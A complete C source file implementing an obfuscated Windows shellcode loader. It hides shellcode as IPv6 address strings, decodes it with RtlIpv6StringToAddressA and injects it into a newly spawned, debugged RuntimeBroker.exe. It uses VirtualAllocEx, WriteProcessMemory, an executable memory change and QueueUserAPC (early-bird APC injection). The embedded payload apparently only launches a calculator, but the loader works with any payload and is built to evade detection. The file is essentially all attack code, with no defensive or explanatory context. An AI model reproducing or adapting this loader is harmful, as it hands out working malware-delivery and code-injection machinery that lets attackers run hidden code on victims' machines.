#include<stdio.h>
#include<windows.h>

#pragma warning (disable:4996);

#define TARGET_PROCESS  "RuntimeBroker.exe"

char* Ipv6Array[] = {
		"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
		"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
		"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
		"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
		"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBE0:1D2A:0A41:BAA6:95BD:9DFF",
		"D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:6300"
};

#define NumberOfElements 17


typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR                   S,
	PCSTR* Terminator,
	PVOID                   Addr
	);

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE pBuffer = NULL;
	PBYTE TmpBuffer = NULL;

	SIZE_T sBuffSize = NULL;

	PCSTR Terminator = NULL;

	NTSTATUS STATUS = NULL;

	// Getting the RtlIpv6StringToAddressA function's base address from ntdll.dll
	fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
	if (pRtlIpv6StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// Getting the size of the shellcode (number of elements * 16)
	sBuffSize = NmbrOfElements * 16;
	// Allocating memory that will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	for (int i = 0; i < NmbrOfElements; i++) {

		if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
			printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
			return FALSE;
		}

		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}

// inject the payload to the remote target process
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	

	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


BOOL CreateDebugedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFO);

	
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,			
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	

	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}


int main() {

	DWORD dwProcessId = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	PVOID pPayloadAddress = NULL;
	PVOID pDeobfuscatedPayload = NULL;
	SIZE_T sPayloadSize = NULL;

	
	if (!CreateDebugedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}


	if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sPayloadSize)){
		return -1;
	}

	
	if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sPayloadSize, &pPayloadAddress)) {
		return -1;
	}
	
	QueueUserAPC((PTHREAD_START_ROUTINE)pPayloadAddress, hThread, NULL);


	DebugActiveProcessStop(dwProcessId);
	
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;


}